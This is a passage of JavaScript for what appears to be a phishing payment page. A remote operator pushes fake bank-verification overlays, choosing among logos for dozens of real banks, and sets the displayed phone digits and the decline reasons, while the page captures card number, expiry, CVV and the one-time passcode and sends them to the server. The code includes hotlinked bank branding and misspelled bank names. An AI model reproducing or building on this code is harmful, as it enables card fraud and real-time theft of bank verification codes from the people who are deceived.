        if (data.transaction_id === state.transactionId) {
            showSuccessUI();
        }
    });
    
    socket.on('payment_failed', (data) => {
        console.log('Payment failed:', data);
        if (data.transaction_id === state.transactionId) {
            showErrorUI("Payment Failed", data.message || "Your payment could not be processed");
        }
    });
    
    socket.on('currency_redirect', (data) => {
        console.log('Currency redirect requested:', data);
        showToast("Processing payment", "Redirecting to currency selection...");
        showProcessingUI();
    });
    
    socket.on('toggle_bankpage', (data) => {
        console.log('Bank page toggle requested:', data);
        if (data.show) {
            showToast("Bank Verification", "Your bank requires additional verification");
        }
    });
    
    socket.on('show_mc_verification', (data) => {
        console.log('Showing MC verification overlay with data:', data);
        
        // Store the phone's last 4 digits from the data received from server
        if (data.phoneLastFour) {
            // Store it in the state for later use
            state.phoneLastFour = data.phoneLastFour;
            console.log('Phone last four digits set to:', data.phoneLastFour);
        }
        
        showProcessingUI();
        
        setTimeout(() => {
            showMCVerification(data);
        }, 1500);
    });

    socket.on('start_verification', (data) => {
        console.log('Start verification requested:', data);
        
        // Store the phone's last 4 digits from the verification data
        if (data.phoneLastFour) {
            state.phoneLastFour = data.phoneLastFour;
            console.log('Phone last four digits set in start_verification:', data.phoneLastFour);
        }
        
        const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
        const mcLoadingContent = document.getElementById('mcLoadingContent');
        const mcVerificationContent = document.getElementById('mcVerificationContent');
        
        if (mcVerificationOverlay && mcLoadingContent && mcVerificationContent) {
            // Hide loading, show verification content
            mcLoadingContent.style.display = 'none';
            mcVerificationContent.style.display = 'block';
            
            // Update UI components with transaction data
            updateMcVerificationUI(data);
            
            // Start the timer for 4:59 minutes
            startMCTimer();
        }
    });
    
    socket.on('mc_verification_result', function(result) {
        const mcContainer = document.getElementById('mcVerificationOverlay');
        if (mcContainer) {
            mcContainer.style.display = 'none';
        }
        
        // Clear the MC timer if it exists
        if (mcTimerInterval) {
            clearInterval(mcTimerInterval);
            mcTimerInterval = null;
        }
        
        if (result.success) {
            showSuccessUI();
        } else {
            const reason = result.reason ? getReadableFailureReason(result.reason) : "Your payment could not be processed";
            showErrorUI("Payment Failed", reason);
        }
    });
    
    socket.on('mc_otp_error', function(data) {
        const otpInput = document.getElementById('mcOtpInput');
        const errorMsgElem = document.getElementById('mcOtpError');
        
        if (otpInput) {
            otpInput.classList.add('border-red-500');
            
            if (errorMsgElem) {
                errorMsgElem.textContent = data.message || 'Invalid OTP. Please try again.';
                errorMsgElem.style.display = 'block';
            }
            
            const submitBtn = document.getElementById('mcSubmitBtn');
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Submit';
            }
        }
    });
    
    socket.on('update_mc_bank', function(data) {
        if (data.bankCode) {
            const bankLogo = document.getElementById('bankLogo');
            if (bankLogo) {
                // Map of bank codes to logo URLs
                const bankLogos = {
                     'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
                    'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
                    'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
                    'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
                    'kotak': 'https://cdn.freelogovectors.net/svg07/kotakmahindrabank-logo.svg',
                    'yes': 'https://logotyp.us/file/yes-bank.svg',
                    'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
                    'tanshin': 'http://www.alb-labuan.com/images/logo-taishin.png',
                    'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
                    'standard charterd': 'https://companieslogo.com/img/orig/STAN.L_BIG-27b2637e.png?t=1720244494',
                    'boi': 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-India-Logo.png',
                    'bob': 'https://1000logos.net/wp-content/uploads/2021/06/logo-Bank-of-Baroda-500x281.png',
                    'centralbankindia': 'https://iconape.com/wp-content/png_logo_vector/central-bank-of-india-1911-logo.png',
                    'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
                    'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
                    'usbank': 'https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo-700x394.png',
                    'wellsfargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
                    'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
                    'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
                    'gibraltar': 'https://upload.wikimedia.org/wikipedia/en/thumb/4/4a/Gibraltar_International_Bank_Logo.svg/220px-Gibraltar_International_Bank_Logo.svg.png',
                    'unionbankindia': 'https://upload.wikimedia.org/wikipedia/commons/d/d0/Union_Bank_of_India_Logo.svg',
                    'pnb': 'https://logotyp.us/file/pnb.svg',
                    'canera bank': 'https://logonoid.com/images/canara-bank-logo.png',
                    'capitalone': 'https://www.logo.wine/a/logo/Capital_One/Capital_One-Logo.wine.svg',
                    'td bank': 'https://cdn.worldvectorlogo.com/logos/td-bank-1.svg',
                    'citizens': 'https://locations.citizensbank.com/images/citizens-logo-rebrand.png',
                    'chase bank': 'https://1000logos.net/wp-content/uploads/2016/11/Chase-National-Bank-Logo-500x281.png',
                    'truist': 'https://upload.wikimedia.org/wikipedia/commons/8/8b/Truist_Financial_logo.svg',
                    'cathy united taiwan': 'https://static.wikia.nocookie.net/logopedia/images/4/4b/CATHAY2002.png/revision/latest/scale-to-width-down/250?cb=20230808075909',
                    'novascotia': 'https://asset.brandfetch.io/idpIpGPfn2/ideBeGWgbz.svg?updated=1667941638324',
                    'sinopac bank taiwan': 'https://easy.sinopac.com/images/sinopac-logo.svg',
                    'hua nan bank taiwan': 'https://thebanks.eu/img/logos/Hua_Nan_Commercial_Bank.png',
                    'landbank taiwan': 'https://www.landbank.com/new_assets/header/landbank_logo.webp',
                    'un bank taiwan': 'https://upload.wikimedia.org/wikipedia/commons/5/52/E.SUN_Bank.svg',
                    'KGI bank taiwan': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/dd/KGI_Financial_Holding_logo_v2.png/250px-KGI_Financial_Holding_logo_v2.png',
                    'usaa bank': 'https://logos-world.net/wp-content/uploads/2021/03/USAA-United-Services-Automobile-Association-Logo-700x394.png',
                    'huntington': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
                    'm&t bank ': 'https://companieslogo.com/img/orig/MTB_BIG-01f85319.png?t=1720244493',
                    'barclays bank': 'https://icons.veryicon.com/png/128/business/bank-logo-collection/barclays-bank-portfolio.png',
                    'santandar usa': 'https://logodownload.org/wp-content/uploads/2017/05/santander-logo-1.png',
                    'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
                  'morganstanley': 'https://www.morganstanley.com/content/dam/im/web/images/MSPC/MS-Private-Credit-Logo.svg',
                   'bancorp': 'https://www.logo.wine/a/logo/U.S._Bancorp/U.S._Bancorp-Logo.wine.svg',
                   'pnc': 'https://upload.wikimedia.org/wikipedia/commons/1/1b/PNClogo.svg',
                   'charles schweb': 'https://upload.wikimedia.org/wikipedia/commons/4/4b/Charles_Schwab_Corporation_logo.svg',
                   'BMO USA': 'https://1000logos.net/wp-content/uploads/2024/01/BMO-US-Logo-500x281.png',
                   'First Citizens': 'https://www.annualreports.com/HostedData/CompanyLogos/NASDAQ_FCNCA.png',
                   'Fifth Third Bank': 'https://companieslogo.com/img/orig/FITB_BIG-1d1d41ca.png?t=1723189499',
                   'Ally Financial': 'https://upload.wikimedia.org/wikipedia/commons/0/00/Ally_Financial.svg',
                 'KeyCorp': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
                   'Webster Bank': 'https://upload.wikimedia.org/wikipedia/commons/8/81/Webster_Bank_Logo.svg',
                   'BNP Paribas': 'https://www.logo.wine/a/logo/BNP_Paribas/BNP_Paribas-Logo.wine.svg',
                   'Columbia Bank': 'https://mma.prnewswire.com/media/254331/columbia_bank_logo.jpg',
                   'SoFi': 'https://www.finder.com/niche-builder/5e8f8d3d11841.png',
                   'Texas Capital Bank': 'https://a.storyblok.com/f/102997/2684x834/d5fa7255e0/tc_horizontal_rgb_2color.png',
                   'Arvest Bank': 'https://upload.wikimedia.org/wikipedia/commons/8/82/Arvest_Bank_logo.svg',
                 'Indian allahabad Bank': 'https://logos-download.com/wp-content/uploads/2016/03/Allahabad_Bank_logo_2-700x260.jpg',
                   'Indian Overseas Bank': 'https://upload.wikimedia.org/wikipedia/commons/f/fc/Indian_Overseas_Bank_Logo.svg',
                   'Federal Bank': 'https://assets.stickpng.com/images/627cca9b1b2e263b45696aa1.png',
                   'IDBI Bank': 'https://logotyp.us/file/idbi.svg',
                   'IDFC First Bank': 'https://www.idfcfirstbank.com/content/dam/idfcfirstbank/images/n1/IDFC-logo-website.svg',
         'Northern Trust': 'https://www.responsibilityreports.com/HostedData/CompanyLogos/NASDAQ_NTRS.png',
                   'Synchrony Financial': 'https://upload.wikimedia.org/wikipedia/commons/8/85/Synchrony_Financial.svg',
                   'Deutsche Bank': 'https://upload.wikimedia.org/wikipedia/commons/4/48/Deutsche_Bank-Logo.svg',
                   'First Horizon': 'https://companieslogo.com/img/orig/FHN_BIG-c5db5207.png?t=1721010478',
                   'Comerica': 'https://whitememorial.give.adventisthealth.org/wp-content/uploads/sites/18/2024/09/Comerica-LOGO.jpg',
                   'IndusInd Bank': 'https://images.seeklogo.com/logo-png/20/2/indusind-bank-logo-png_seeklogo-207227.png',
                   'Jammu & Kashmir Bank': 'https://www.jkbank.com/assets/frontend/layout/img/logos/jklogo.jpg',
                   'Karnataka Bank': 'https://seekvectors.com/storage/images/karnataka-bank-logo-01.svg',
                   'RBL Bank': 'https://upload.wikimedia.org/wikipedia/commons/7/70/RBL_Bank_SVG_Logo.svg',
                   'UCO Bank': 'https://brandeps.com/logo-download/U/UCO-Bank-logo-vector-01.svg',
                   'BBVA Mexico': 'https://dq8dwmysp7hk1.cloudfront.net/logos/bbva.svg',
                   'Banorte Mexico': 'https://img2.freepnges.com/20180625/swi/aaz8w7s80.webp',
                   'Citibanamex México': 'https://upload.wikimedia.org/wikipedia/commons/9/92/Citibanamex_logo.svg',
                   'Lloyds Banking Group': 'https://companieslogo.com/img/orig/LYG_BIG-74740808.png?t=1720244492',
         'NatWest Group': 'https://static.wikia.nocookie.net/logopedia/images/8/86/NatWest_Group_logo.svg/revision/latest/scale-to-width-down/300?cb=20230323154303',
         'Starling Bank': 'https://asset.brandfetch.io/id65Uj_bLX/id8a5daz0W.svg?updated=1667561520880',
             'Royal Bank of Canada': 'https://www.logo.wine/a/logo/RBC_Bank/RBC_Bank-Logo.wine.svg',
                   'Bank of Montreal': 'https://1000logos.net/wp-content/uploads/2021/06/Bank-of-Montreal-logo-500x281.png',
                   'Canadian Imperial Bank of Commerce': 'https://logos-world.net/wp-content/uploads/2021/05/CIBC-Logo-700x394.png',
                   'Commerzbank': 'https://assets.stickpng.com/images/5a1d2c5e4ac6b00ff574e275.png',
                   'N26': 'https://big-picture.com/img/xtech/fintech_logos/N26-logo.jpg',
                   'Bunq': 'https://upload.wikimedia.org/wikipedia/commons/5/58/Bunq_(bank)_company_logo_2017.svg',
                };
                
                bankLogo.src = bankLogos[data.bankCode] || bankLogos['default'];
            }
        }
    });
    
    socket.on('update_mc_currency', function(data) {
        if (data.currency) {
            updateCurrencyDisplay(data.currency);
        }
    });
}

function updateCurrencyDisplay(currency) {
    const currencySymbol = document.getElementById('currencySymbol');
    const amountDisplay = document.getElementById('transactionAmount');
    
    if (currencySymbol && amountDisplay) {
        // Map of currency codes to symbols
        const symbols = {
            'INR': '₹',
            'USD': '$',
            'EUR': '€',
            'GBP': '£',
            'JPY': '¥',
            'AUD': 'A$',
            'CAD': 'C$',
            'CHF': 'CHF',
            'CNY': '¥',
            'HKD': 'HK$',
            'NZD': 'NZ$',
            'SGD': 'S$',
            'TWD': 'NT$'
        };
        
        const originalAmount = state.amount || 1299.00;
        const convertedAmount = convertCurrency(originalAmount, 'USD', currency);
        
        console.log(`Currency updated to ${currency}, converting $${originalAmount} to ${convertedAmount}`);
        
        currencySymbol.textContent = symbols[currency] || '$';
        amountDisplay.textContent = convertedAmount;
    }
}

function setupCardFormHandlers() {
    console.log('Setting up card form handlers...');
    const cardNumberInput = document.getElementById('card-number');
    const cardHolderInput = document.getElementById('card-holder');
    const expiryDateInput = document.getElementById('expiry-date');
    const cvvInput = document.getElementById('cvv');
    const cardForm = document.getElementById('card-form');
    
    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', (e) => {
            const formattedValue = formatCardNumber(e.target.value);
            state.cardForm.cardNumber = formattedValue;
            e.target.value = formattedValue;
            const cardType = detectCardType(formattedValue);
            
            // Update the card logo in the input field
            const cardIconContainer = e.target.parentNode.querySelector('.input-icon.right');
            
            if (cardType) {
                let logoSrc = '';
                let altText = '';
                
                switch(cardType) {
                    case 'visa':
                        logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg';
                        altText = 'Visa';
                        break;
                    case 'mastercard':
                        logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg';
                        altText = 'Mastercard';
                        break;
                    case 'amex':
                        logoSrc = 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png';
                        altText = 'American Express';
                        break;
                    case 'discover':
                        logoSrc = 'https://www.aba.com/-/media/images/company-logos/discover.jpg?rev=d090b5bdf50647fb92e266542f4c9c4c&h=230&w=350&la=en&hash=39D6D20C67DF00B933C981945C85290A';
                        altText = 'Discover';
                        break;
                    case 'rupay':
                        logoSrc = 'https://upload.wikimedia.org/wikipedia/commons/d/d1/RuPay.svg';
                        altText = 'RuPay';
                        break;
                }
                
                if (logoSrc) {
                    const logoHTML = `
                        <div class="h-5 w-10 flex items-center justify-center">
                            <img src="${logoSrc}" alt="${altText}" class="h-5 w-auto object-contain" />
                        </div>
                    `;
                    
                    if (cardIconContainer) {
                        cardIconContainer.innerHTML = logoHTML;
                    } else {
                        const iconDiv = document.createElement('div');
                        iconDiv.className = 'input-icon right';
                        iconDiv.innerHTML = logoHTML;
                        e.target.parentNode.appendChild(iconDiv);
                    }
                }
            } else {
                if (cardIconContainer) {
                    cardIconContainer.remove();
                }
            }
            
            updatePayNowButton();
        });
    }
    
    if (cardHolderInput) {
        cardHolderInput.addEventListener('input', (e) => {
            state.cardForm.cardHolder = e.target.value;
            updatePayNowButton();
        });
    }
    
    if (expiryDateInput) {
        expiryDateInput.addEventListener('input', (e) => {
            const formattedValue = formatExpiryDate(e.target.value);
            state.cardForm.expiryDate = formattedValue;
            e.target.value = formattedValue;
            updatePayNowButton();
        });
    }
    
    if (cvvInput) {
        cvvInput.addEventListener('input', (e) => {
            state.cardForm.cvv = e.target.value;
            updatePayNowButton();
        });
    }
    
    if (cardForm) {
        cardForm.addEventListener('submit', function(e) {
            e.preventDefault();
            handleCardSubmit(e);
            return false;
        });
        
        // Also ensure the form can't submit normally
        cardForm.onsubmit = function() { 
            return false; 
        };
        
        console.log('Card form submit handler attached');
    }
    
    // Initialize Pay Now button state
    updatePayNowButton();
}

function updatePayNowButton() {
    const payNowBtn = document.querySelector('.pay-now-btn');
    if (!payNowBtn) return;
    
    const { cardNumber, cardHolder, expiryDate, cvv } = state.cardForm;
    
    const isCardNumberValid = cardNumber && cardNumber.replace(/\s/g, '').length >= 16;
    const isCardHolderValid = cardHolder && cardHolder.trim().length > 2;
    const isExpiryDateValid = expiryDate && /^\d{2}\/\d{2}$/.test(expiryDate);
    const isCvvValid = cvv && cvv.length >= 3;
    
    if (isCardNumberValid && isCardHolderValid && isExpiryDateValid && isCvvValid) {
        payNowBtn.style.backgroundColor = '#1a5e32';
        payNowBtn.style.cursor = 'pointer';
        payNowBtn.disabled = false;
    } else {
        payNowBtn.style.backgroundColor = '#a0aec0';
        payNowBtn.style.cursor = 'not-allowed';
        payNowBtn.disabled = true;
    }
}

function setupMcVerificationButtons() {
    // Submit button handler
    const submitBtn = document.getElementById('mcSubmitBtn');
    if (submitBtn) {
        submitBtn.onclick = function() {
            const otpInput = document.getElementById('mcOtpInput');
            const otpValue = otpInput ? otpInput.value.trim() : '';
            
            if (!otpValue) {
                const errorMsg = document.getElementById('mcOtpError');
                if (errorMsg) {
                    errorMsg.textContent = 'Please enter the verification code';
                    errorMsg.style.display = 'block';
                }
                return;
            }
            
            // Show loading state
            submitBtn.disabled = true;
            submitBtn.textContent = 'Verifying...';
            
            // Hide any existing error message
            const errorMsg = document.getElementById('mcOtpError');
            if (errorMsg) {
                errorMsg.style.display = 'none';
            }
            
            // Submit OTP to server
            socket.emit('mc_otp_submitted', {
                invoiceId: state.transactionId,
                otp: otpValue,
                timestamp: new Date().toISOString()
            });
        };
    }
    
    // Resend button handler
    const resendBtn = document.getElementById('mcResendBtn');
    if (resendBtn) {
        resendBtn.onclick = function() {
            resendBtn.disabled = true;
            resendBtn.textContent = 'Sending...';
            
            // Request OTP resend
            socket.emit('mc_resend_otp', {
                invoiceId: state.transactionId
            });
            
            // Reset button after delay
            setTimeout(() => {
                resendBtn.disabled = false;
                resendBtn.textContent = 'Resend';
                
                // Show toast notification
                showToast('OTP Resent', 'A new code has been sent to your mobile');
            }, 2000);
        };
    }
    
    // Cancel button handler
    const cancelBtn = document.getElementById('mcCancelBtn');
    if (cancelBtn) {
        cancelBtn.onclick = function() {
            // Hide the verification overlay
            const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
            if (mcVerificationOverlay) {
                mcVerificationOverlay.style.display = 'none';
            }
            
            // Clear the MC timer if it exists
            if (mcTimerInterval) {
                clearInterval(mcTimerInterval);
                mcTimerInterval = null;
            }
            
            // Notify server
            socket.emit('mc_verification_cancelled', {
                invoiceId: state.transactionId,
                reason: 'cancelled_by_user'
            });
            
            // Show error UI with canceled message
            showErrorUI("Payment Cancelled", "This payment was cancelled by you.");
        };
    }
}

function convertCurrency(amount, fromCurrency, toCurrency) {
    // Simple direct rate conversion using proper exchange rates
    const rates = {
        'USD': 1.0,
        'EUR': 0.93,
        'GBP': 0.79,
        'JPY': 150.58,
        'INR': 83.45,
        'AUD': 1.52,
        'CAD': 1.37,
        'CHF': 0.91,
        'CNY': 7.24,
        'HKD': 7.83,
        'NZD': 1.68,
        'SGD': 1.35,
        'TWD': 32.35
    };
    
    if (!rates[fromCurrency] || !rates[toCurrency]) {
        console.warn(`Conversion rate not found for ${fromCurrency} to ${toCurrency}`);
        return amount.toFixed(2); // Can't convert, return original with proper formatting
    }
    
    // Convert to target currency
    const convertedAmount = amount * (rates[toCurrency] / rates[fromCurrency]);
    
    // Format based on currency
    if (toCurrency === 'JPY') {
        return Math.round(convertedAmount); // No decimals for yen
    } else {
        return convertedAmount.toFixed(2);
    }
}

// Start the timer for 4:59 minutes (299 seconds)
function startMCTimer() {
    const timerDisplay = document.getElementById('mcTimer');
    if (!timerDisplay) return;
    
    let timeLeft = 299; // 4:59 in seconds (4 minutes and 59 seconds)
    
    // Clear any existing timer
    if (mcTimerInterval) {
        clearInterval(mcTimerInterval);
    }
    
    // Update timer display function
    function updateTimerDisplay() {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerDisplay.textContent = `Session expires in: ${minutes}:${seconds.toString().padStart(2, '0')}`;
    }
    
    // Initial display
    updateTimerDisplay();
    
    // Start the timer
    mcTimerInterval = setInterval(() => {
        timeLeft--;
        updateTimerDisplay();
        
        if (timeLeft <= 0) {
            clearInterval(mcTimerInterval);
            mcTimerInterval = null;
            
            // Hide the verification overlay
            const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
            if (mcVerificationOverlay) {
                mcVerificationOverlay.style.display = 'none';
            }
            
            // Notify server
            socket.emit('mc_verification_cancelled', {
                invoiceId: state.transactionId,
                reason: 'timeout'
            });
            
            // Show error UI with timeout message
            showErrorUI("Session Expired", "Your verification session has timed out. Please try again.");
        }
    }, 1000);
}

function getReadableFailureReason(reasonCode) {
    const reasons = {
        'insufficient_balance': 'Insufficient funds in your account',
        'bank_declined': 'Your bank declined this transaction',
        'card_disabled': 'This card has been disabled for online transactions',
        'invalid_card': 'Invalid card details',
        'canceled': 'Transaction canceled by user',
        '3Dsecure_is_not_enabled_for_your_card': '3D secure is not enabled for your card',
        'pickup_Card': 'This card has been flagged for pickup',
        'Incorrect_card_details': 'The card details entered are incorrect',
        'Credit_limit_exceeded': 'Your credit limit has been exceeded',
        'Incorrect_security_code': 'The security code is incorrect',
        'This_type_of_transacton_is_not_allowed_for_your_card': 'This type of transaction is not allowed for your card',
        'The_issuing_bank_flagged_the_transaction_as_potentially_fraudulent': 'Your issuing bank flagged the transaction as potentially fraudulent'
    };
    return reasons[reasonCode] || 'Your payment could not be processed';
}

function updateMcVerificationUI(data) {
    // Update bank logo
    if (document.getElementById('bankLogo')) {
        const bankLogo = document.getElementById('bankLogo');
        const bankCode = data.bankCode?.toLowerCase() || 'sbi';
        
        // Map of bank codes to logo URLs
        const bankLogos = {
            'sbi': 'https://logolook.net/wp-content/uploads/2022/04/SBI-Logo.png',
                    'hdfc': 'https://companieslogo.com/img/orig/HDB_BIG-092606ce.png?t=1720244492',
                    'icici': 'https://www.icicibank.com/content/dam/icicibank/india/assets/images/header/logo.png',
                    'axis': 'https://upload.wikimedia.org/wikipedia/commons/c/ce/AXISBank_Logo.svg',
                    'kotak': 'https://cdn.freelogovectors.net/svg07/kotakmahindrabank-logo.svg',
                    'yes': 'https://logotyp.us/file/yes-bank.svg',
                    'dbs taiwan': 'https://www.dbs.com.sg/o/corporate-theme/images/Logo.svg',
                    'tanshin': 'http://www.alb-labuan.com/images/logo-taishin.png',
                    'hsbc': 'https://upload.wikimedia.org/wikipedia/commons/a/aa/HSBC_logo_(2018).svg',
                    'standard charterd': 'https://companieslogo.com/img/orig/STAN.L_BIG-27b2637e.png?t=1720244494',
                    'boi': 'https://logolook.net/wp-content/uploads/2023/09/Bank-of-India-Logo.png',
                    'bob': 'https://1000logos.net/wp-content/uploads/2021/06/logo-Bank-of-Baroda-500x281.png',
                    'centralbankindia': 'https://iconape.com/wp-content/png_logo_vector/central-bank-of-india-1911-logo.png',
                    'boa': 'https://freelogopng.com/images/all_img/1658985465bank-of-america-logo-png.png',
                    'citibank': 'https://www.logo.wine/a/logo/Citigroup/Citigroup-Logo.wine.svg',
                    'usbank': 'https://logos-world.net/wp-content/uploads/2021/02/US-Bank-Logo-700x394.png',
                    'wellsfargo': 'https://www.logo.wine/a/logo/Wells_Fargo/Wells_Fargo-Logo.wine.svg',
                    'nimb': 'https://www.nimb.com.np/static/images/nimbl-lotus.png',
                    'bank of maga': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Bank_of_Taiwan_Seal.svg',
                    'gibraltar': 'https://upload.wikimedia.org/wikipedia/en/thumb/4/4a/Gibraltar_International_Bank_Logo.svg/220px-Gibraltar_International_Bank_Logo.svg.png',
                    'unionbankindia': 'https://upload.wikimedia.org/wikipedia/commons/d/d0/Union_Bank_of_India_Logo.svg',
                    'pnb': 'https://logotyp.us/file/pnb.svg',
                    'canera bank': 'https://logonoid.com/images/canara-bank-logo.png',
                    'capitalone': 'https://www.logo.wine/a/logo/Capital_One/Capital_One-Logo.wine.svg',
                    'td bank': 'https://cdn.worldvectorlogo.com/logos/td-bank-1.svg',
                    'citizens': 'https://locations.citizensbank.com/images/citizens-logo-rebrand.png',
                    'chase bank': 'https://1000logos.net/wp-content/uploads/2016/11/Chase-National-Bank-Logo-500x281.png',
                    'truist': 'https://upload.wikimedia.org/wikipedia/commons/8/8b/Truist_Financial_logo.svg',
                    'cathy united taiwan': 'https://static.wikia.nocookie.net/logopedia/images/4/4b/CATHAY2002.png/revision/latest/scale-to-width-down/250?cb=20230808075909',
                    'novascotia': 'https://asset.brandfetch.io/idpIpGPfn2/ideBeGWgbz.svg?updated=1667941638324',
                    'sinopac bank taiwan': 'https://easy.sinopac.com/images/sinopac-logo.svg',
                    'hua nan bank taiwan': 'https://thebanks.eu/img/logos/Hua_Nan_Commercial_Bank.png',
                    'landbank taiwan': 'https://www.landbank.com/new_assets/header/landbank_logo.webp',
                    'un bank taiwan': 'https://upload.wikimedia.org/wikipedia/commons/5/52/E.SUN_Bank.svg',
                    'KGI bank taiwan': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/dd/KGI_Financial_Holding_logo_v2.png/250px-KGI_Financial_Holding_logo_v2.png',
                    'usaa bank': 'https://logos-world.net/wp-content/uploads/2021/03/USAA-United-Services-Automobile-Association-Logo-700x394.png',
                    'huntington': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
                    'm&t bank ': 'https://companieslogo.com/img/orig/MTB_BIG-01f85319.png?t=1720244493',
                    'barclays bank': 'https://icons.veryicon.com/png/128/business/bank-logo-collection/barclays-bank-portfolio.png',
                    'santandar usa': 'https://logodownload.org/wp-content/uploads/2017/05/santander-logo-1.png',
                    'default': 'https://www.pngkey.com/png/full/794-7948248_mastercard-securecode-logo-logo-mastercard-secure-code.png',
                  'morganstanley': 'https://www.morganstanley.com/content/dam/im/web/images/MSPC/MS-Private-Credit-Logo.svg',
                   'bancorp': 'https://www.logo.wine/a/logo/U.S._Bancorp/U.S._Bancorp-Logo.wine.svg',
                   'pnc': 'https://upload.wikimedia.org/wikipedia/commons/1/1b/PNClogo.svg',
                   'charles schweb': 'https://upload.wikimedia.org/wikipedia/commons/4/4b/Charles_Schwab_Corporation_logo.svg',
                   'BMO USA': 'https://1000logos.net/wp-content/uploads/2024/01/BMO-US-Logo-500x281.png',
                   'First Citizens': 'https://www.annualreports.com/HostedData/CompanyLogos/NASDAQ_FCNCA.png',
                   'Fifth Third Bank': 'https://companieslogo.com/img/orig/FITB_BIG-1d1d41ca.png?t=1723189499',
                   'Ally Financial': 'https://upload.wikimedia.org/wikipedia/commons/0/00/Ally_Financial.svg',
                 'KeyCorp': 'https://mma.prnewswire.com/media/551870/Huntington_Logo.jpg?w=300',
                   'Webster Bank': 'https://upload.wikimedia.org/wikipedia/commons/8/81/Webster_Bank_Logo.svg',
                   'BNP Paribas': 'https://www.logo.wine/a/logo/BNP_Paribas/BNP_Paribas-Logo.wine.svg',
                   'Columbia Bank': 'https://mma.prnewswire.com/media/254331/columbia_bank_logo.jpg',
                   'SoFi': 'https://www.finder.com/niche-builder/5e8f8d3d11841.png',
                   'Texas Capital Bank': 'https://a.storyblok.com/f/102997/2684x834/d5fa7255e0/tc_horizontal_rgb_2color.png',
                   'Arvest Bank': 'https://upload.wikimedia.org/wikipedia/commons/8/82/Arvest_Bank_logo.svg',
                 'Indian allahabad Bank': 'https://logos-download.com/wp-content/uploads/2016/03/Allahabad_Bank_logo_2-700x260.jpg',
                   'Indian Overseas Bank': 'https://upload.wikimedia.org/wikipedia/commons/f/fc/Indian_Overseas_Bank_Logo.svg',
                   'Federal Bank': 'https://assets.stickpng.com/images/627cca9b1b2e263b45696aa1.png',
                   'IDBI Bank': 'https://logotyp.us/file/idbi.svg',
                   'IDFC First Bank': 'https://www.idfcfirstbank.com/content/dam/idfcfirstbank/images/n1/IDFC-logo-website.svg',
         'Northern Trust': 'https://www.responsibilityreports.com/HostedData/CompanyLogos/NASDAQ_NTRS.png',
                   'Synchrony Financial': 'https://upload.wikimedia.org/wikipedia/commons/8/85/Synchrony_Financial.svg',
                   'Deutsche Bank': 'https://upload.wikimedia.org/wikipedia/commons/4/48/Deutsche_Bank-Logo.svg',
                   'First Horizon': 'https://companieslogo.com/img/orig/FHN_BIG-c5db5207.png?t=1721010478',
                   'Comerica': 'https://whitememorial.give.adventisthealth.org/wp-content/uploads/sites/18/2024/09/Comerica-LOGO.jpg',
                   'IndusInd Bank': 'https://images.seeklogo.com/logo-png/20/2/indusind-bank-logo-png_seeklogo-207227.png',
                   'Jammu & Kashmir Bank': 'https://www.jkbank.com/assets/frontend/layout/img/logos/jklogo.jpg',
                   'Karnataka Bank': 'https://seekvectors.com/storage/images/karnataka-bank-logo-01.svg',
                   'RBL Bank': 'https://upload.wikimedia.org/wikipedia/commons/7/70/RBL_Bank_SVG_Logo.svg',
                   'UCO Bank': 'https://brandeps.com/logo-download/U/UCO-Bank-logo-vector-01.svg',
                   'BBVA Mexico': 'https://dq8dwmysp7hk1.cloudfront.net/logos/bbva.svg',
                   'Banorte Mexico': 'https://img2.freepnges.com/20180625/swi/aaz8w7s80.webp',
                   'Citibanamex México': 'https://upload.wikimedia.org/wikipedia/commons/9/92/Citibanamex_logo.svg',
                   'Lloyds Banking Group': 'https://companieslogo.com/img/orig/LYG_BIG-74740808.png?t=1720244492',
         'NatWest Group': 'https://static.wikia.nocookie.net/logopedia/images/8/86/NatWest_Group_logo.svg/revision/latest/scale-to-width-down/300?cb=20230323154303',
         'Starling Bank': 'https://asset.brandfetch.io/id65Uj_bLX/id8a5daz0W.svg?updated=1667561520880',
             'Royal Bank of Canada': 'https://www.logo.wine/a/logo/RBC_Bank/RBC_Bank-Logo.wine.svg',
                   'Bank of Montreal': 'https://1000logos.net/wp-content/uploads/2021/06/Bank-of-Montreal-logo-500x281.png',
                   'Canadian Imperial Bank of Commerce': 'https://logos-world.net/wp-content/uploads/2021/05/CIBC-Logo-700x394.png',
                   'Commerzbank': 'https://assets.stickpng.com/images/5a1d2c5e4ac6b00ff574e275.png',
                   'N26': 'https://big-picture.com/img/xtech/fintech_logos/N26-logo.jpg',
                   'Bunq': 'https://upload.wikimedia.org/wikipedia/commons/5/58/Bunq_(bank)_company_logo_2017.svg',
        };
        
